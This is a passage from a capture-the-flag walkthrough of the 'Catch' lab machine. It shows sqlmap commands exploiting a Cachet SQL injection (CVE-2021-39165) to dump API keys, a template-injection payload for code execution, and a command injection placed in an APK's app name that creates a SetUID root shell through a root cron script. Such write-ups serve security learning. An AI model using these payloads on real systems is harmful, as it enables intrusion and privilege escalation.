Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-104-generic x86_64)
...[snip]...
will@catch:~$

```

## Shell as will [Alt #2]

This path still requires getting access to Cachet to get the API key, but then uses SQL injection in the API plus server-side template injection (SSTI) to get a shell in the container:

[![](https://0xdfimages.gitlab.io/img/Catch-Flow-alt-2.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/Catch-Flow-alt-2.png)

### Get API Key via SQLI

#### CVE-2021-39165

There’s an unauthenticated SQL injection in Cachet. This means that I can skip the Let’s Chat part, and go read the database. The researcher who discovered and reported CVE-2021-39165 has a [really detailed blog post](https://www.leavesongs.com/PENETRATION/cachet-from-laravel-sqli-to-bug-bounty.html) about it (and more).

The SQL injection is boolean blind, which is to say, I get to ask yes or no questions (like, is the first character in this column and row an “a”?), and slowly figure out what’s in the database. I’ll use the POC from the post to find the injection:

```

oxdf@hacky$ sqlmap -u "http://status.catch.htb:8000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=%3F%20and%201=1)*+--+" --batch
...[snip]...
sqlmap identified the following injection point(s) with a total of 92 HTTP(s) requests:
---
Parameter: #1* (URI)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://status.catch.htb:8000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+'a'=? and 1=1) AND (SELECT 3497 FROM (SELECT(SLEEP(5)))gMJf)+--+
---
...[snip]...

```

Interestingly, it couldn’t find a boolean injection, but only a time-based one. I wasn’t able to recreate the boolean injection manually either. I think it’s missing data in the database (because this is an unintended path on a CTF box) that it would show or not show, and that’s why it fails. This is more of a pain (no threads), but will still work.

#### Enumerate DB

Because the injection is slow, I’ll guess that the DB name is the same as the [example](https://github.com/CachetHQ/Cachet/blob/2.4/.env.example) `.env` file, “cachet”. There should be a `users` table that has hashes and API keys. From [the docs](https://docs.cachethq.io/docs/api-authentication), API keys are created when the user is created:

> The API Token is generated at installation time for the main user or when a new team member is added to your status page and can be found on your profile page (click your profile picture to get there).

The `User` object ([defined here](https://github.com/CachetHQ/Cachet/blob/2.4/app/Models/User.php)) has `username`, `password`, and `api_key` fields, among others. I would normally dump the password, but I know from the chat leak that it’s not something I can crack. I’ll dump the `username` and `api_key`:

```

oxdf@hacky$ sqlmap -u "http://status.catch.htb:8000/api/v1/components?name=1&1[0]=&1[1]=a&1[2]=&1[3]=or+%27a%27=%3F%20and%201=1)*+--+" --batch -D cachet -T users -C username,api_key --dump
...[snip]...
Database: cachet
Table: users
[2 entries]
+----------+----------------------+
| username | api_key              |
+----------+----------------------+
| john     | 7GVCqTY5abrox48Nct8j |
| admin    | rMSN8kJN9TPADl2cWv8N |
+----------+----------------------+

```

### Get API Key Via Profile

Alternatively, instead of using the SQL injection, I can use the Let’s Chat API to get john’s password, shown [above](#enumerate-chat). Then, logged in as john, visiting the Profile page shows the API key:

![image-20220629144543952](https://0xdfimages.gitlab.io/img/image-20220629144543952.png)

### Generate Template

The [Cachet API docs](https://docs.cachethq.io/reference/ping) don’t show a way to create templates using the API. That means I’ll need the GUI access as john to do this part (though hit me up on Discord or Twitter if you figured out how to do this with only an API key).

I’ll use the POC from the [CVE-2021-39165 writeup](https://www.leavesongs.com/PENETRATION/cachet-from-laravel-sqli-to-bug-bounty.html):

```

{{["id"]|filter("system")|join(",")}}

```

I’ll create a template named “id” with that as the body and click “Create”:

![image-20220629150159290](https://0xdfimages.gitlab.io/img/image-20220629150159290.png)

### Trigger SSRF

Only the API triggers the SSRF. I’ll use Repeater to send the request:

[![image-20220629150338651](https://0xdfimages.gitlab.io/img/image-20220629150338651.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220629150338651.png)

That’s code execution. I can update this or create a new template with a reverse shell payload, and it returns a shell in the container.

## Shell as root

### Enumeration

#### Filesystem

There’s nothing interesting in `/home/will`. Looking around the file system, there’s two directories in `/opt`:

```

will@catch:/opt$ ls
containerd  mdm

```

There’s a bunch of `docker-proxy` processes in the `ps auxww` output:

```

root        1403  0.0  0.0 548252   668 ?        Sl   Jun19   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6000 -container-ip 172.17.0.2 -container-port 80
root        1565  0.0  0.0 400788   484 ?        Sl   Jun19   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6001 -container-ip 172.17.0.3 -container-port 80
root        1787  0.0  0.0 548252   472 ?        Sl   Jun19   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6002 -container-ip 172.17.0.4 -container-port 80
root        2715  0.0  0.0 400788   448 ?        Sl   Jun19   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6003 -container-ip 172.17.0.5 -container-port 80
root        3344  0.0  0.0 400788   504 ?        Sl   Jun19   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6004 -container-ip 172.17.0.6 -container-port 80
root        3828  0.0  0.0 548252   376 ?        Sl   Jun19   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6005 -container-ip 172.17.0.7 -container-port 80
root        4551  0.0  0.0 548252   400 ?        Sl   Jun19   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6006 -container-ip 172.17.0.8 -container-port 80
root        4899  0.0  0.0 400788   496 ?        Sl   Jun19   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6007 -container-ip 172.17.0.9 -container-port 80
root        5585  0.0  0.0 548252   484 ?        Sl   Jun19   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6008 -container-ip 172.17.0.10 -container-port 80
root        6438  0.0  0.0 474520   408 ?        Sl   Jun19   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6009 -container-ip 172.17.0.11 -container-port 80
root        6989  0.0  0.0 400788   404 ?        Sl   Jun19   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6010 -container-ip 172.17.0.12 -container-port 80
root        7544  0.0  0.0 474520   496 ?        Sl   Jun19   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6011 -container-ip 172.17.0.13 -container-port 80
root        8026  0.0  0.0 474520   404 ?        Sl   Jun19   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6012 -container-ip 172.17.0.14 -container-port 80
root        8779  0.0  0.0 474520   872 ?        Sl   Jun19   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6013 -container-ip 172.17.0.15 -container-port 80
root        9105  0.0  0.0 400788   824 ?        Sl   Jun19   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6014 -container-ip 172.17.0.16 -container-port 80
root        9844  0.0  0.0 548252  1392 ?        Sl   Jun19   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 172.17.0.1 -host-port 6015 -container-ip 172.17.0.17 -container-port 80

```

These are likely containers used to load-balance the Cachet step, so that more players can solve the `.env` overwrite at the same time. I’m not able to access the `containerd` folder as will.

`mdm` is more interesting. It has a shell script and an empty folder:

```

will@catch:/opt/mdm$ ls
apk_bin  verify.sh

```

#### Processes

To look at the running processes, I’ll upload [pspy](https://github.com/DominicBreuker/pspy) using `scp`:

```

oxdf@hacky$ sshpass -p 's2#4Fg0_%3!' scp /opt/pspy/pspy64 will@10.10.11.150:/dev/shm/

```

On running it, I’ll notice that `verify.sh` is running as root every minute:

```

2022/06/29 19:25:01 CMD: UID=0    PID=1000440 | /bin/bash /opt/mdm/verify.sh 

```

### verify.sh

#### General

The general structure of the file is to define four functions, and then have a loop that calls them:

```

#!/bin/bash

###################
# Signature Check #
###################    
                                                 
sig_check() {
...[snip]]]
}

#######################
# Compatibility Check #
#######################
                                                 
comp_check() {     
...[snip]...
}  

####################
# Basic App Checks #
####################
                                                 
app_check() {        
...[snip]...
}

###########
# Cleanup #
###########

cleanup() {
        rm -rf $PROCESS_BIN;rm -rf "$DROPBOX/*" "$IN_FOLDER/*";rm -rf $(ls -A /opt/mdm | grep -v apk_bin | grep -v verify.sh)
}

###################
# MDM CheckerV1.0 #
###################

DROPBOX=/opt/mdm/apk_bin
IN_FOLDER=/root/mdm/apk_bin
OUT_FOLDER=/root/mdm/certified_apps
PROCESS_BIN=/root/mdm/process_bin

for IN_APK_NAME in $DROPBOX/*.apk;do
        OUT_APK_NAME="$(echo ${IN_APK_NAME##*/} | cut -d '.' -f1)_verified.apk"
        APK_NAME="$(openssl rand -hex 12).apk"
        if [[ -L "$IN_APK_NAME" ]]; then
                exit
        else
                mv "$IN_APK_NAME" "$IN_FOLDER/$APK_NAME"
        fi
        sig_check $IN_FOLDER $APK_NAME
        comp_check $IN_FOLDER $APK_NAME $PROCESS_BIN
        app_check $PROCESS_BIN $OUT_FOLDER $IN_FOLDER $OUT_APK_NAME
done
cleanup

```

It’s looping over all the `.apk` files in `/opt/mdm/apk_bin`. For each, it generates an output filename, by removing everything before the last `/` (using [var##word](https://tldp.org/LDP/Bash-Beginners-Guide/html/sect_10_03.html)), splitting at `.`, and then adding `_verified.apk` to the end.

It checks if the file is a symbolic link, and if so, it exits. Otherwise, it moves the APK into a folder in `/root`.

Then it calls `sig_check`, `comp_check`, and `app_check`. Once the loop is complete, it calls `cleanup`.

#### app\_check

The `app_check` function has a command injection vulnerability in it:

```

app_check() {                                    
        APP_NAME=$(grep -oPm1 "(?<=<string name=\"app_name\">)[^<]+" "$1/res/values/strings.xml") 
        echo $APP_NAME
        if [[ $APP_NAME == *"Catch"* ]]; then
                echo -n $APP_NAME|xargs -I {} sh -c 'mkdir {}'
                mv "$3/$APK_NAME" "$2/$APP_NAME/$4"
        else
                echo "[!] App doesn't belong to Catch Global"
                cleanup                      
                exit
        fi
}   

```

It uses `grep` to pull the name out of `strings.xml`, and then if “Catch” is present in the name it makes a directory and moves the apk into it.

To command inject, I’ll just need to have the name get set to something with a subshell (`$()`), and that will be executed.

### Command Injection

#### Edit APK

I’ll use `apktool` to decompile the APK into its sources, as described [here](https://medium.com/@sandeepcirusanagunla/decompile-and-recompile-an-android-apk-using-apktool-3d84c2055a82). I’ll grab the latest release [here](https://github.com/iBotPeaches/Apktool/releases/tag/v2.6.1). Because this APK isn’t going to run on a device, I don’t have to worry about signing it.

I’ll start by decompiling the app:

```

oxdf@hacky$ java -jar apktool_2.6.1.jar d catchv1.0.apk -o decomp
I: Using Apktool 2.6.1 on catchv1.0.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: /home/oxdf/.local/share/apktool/framework/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...

```

I’ll verify that I can rebuild that with no changes, just to make sure my system is working:

```

oxdf@hacky$ java -jar apktool_2.6.1.jar b -f decomp/ -o test.apk
I: Using Apktool 2.6.1
I: Smaling smali folder into classes.dex...
I: Building resources...
I: Building apk file...
I: Copying unknown files/dir...
I: Built apk...
oxdf@hacky$ rm test.apk 

```

I was getting errors at one point that kind of looked like [this issue](https://github.com/iBotPeaches/Apktool/issues/1842), and were fixed by running `apktool empty-framework-dir --force` as suggested there.

I’ll open `decomp/res/values/strings.xml` and edit the `app_name`:

```

    <string name="app_name">Catch$(cp /bin/bash /tmp/0xdf; chmod 4777 /tmp/0xdf)</string>

```

This will copy `bash` into `/tmp` and make it SetUID to run as root.

Build it back up:

```

oxdf@hacky$ java -jar apktool_2.6.1.jar b -f decomp/ -o modified.apk
I: Using Apktool 2.6.1
I: Smaling smali folder into classes.dex...
I: Building resources...
I: Building apk file...
I: Copying unknown files/dir...
I: Built apk...

```

#### Upload

I’ll upload this to Catch using `scp`, right into the dropbox directory:

```

oxdf@hacky$ sshpass -p 's2#4Fg0_%3!' scp modified.apk will@10.10.11.150:/opt/mdm/apk_bin/

```

#### Shell

Once a minute rolls over, I’ll check, and there’s a SetUID `0xdf` file in `/tmp`:

```

will@catch:/opt/mdm$ ls -l /tmp/0xdf
-rwsrwxrwx 1 root root 1183448 Jun 29 20:16 /tmp/0xdf

```

Running it (with `-p` to not drop privs) gives a shell with euid of root:

```

will@catch:/opt/mdm$ /tmp/0xdf -p
0xdf-5.0# id
uid=1000(will) gid=1000(will) euid=0(root) groups=1000(will)

```

That’s enough to read the flag:

```

0xdf-5.0# cd /root
0xdf-5.0# cat root.txt
ac5a5ae9************************

```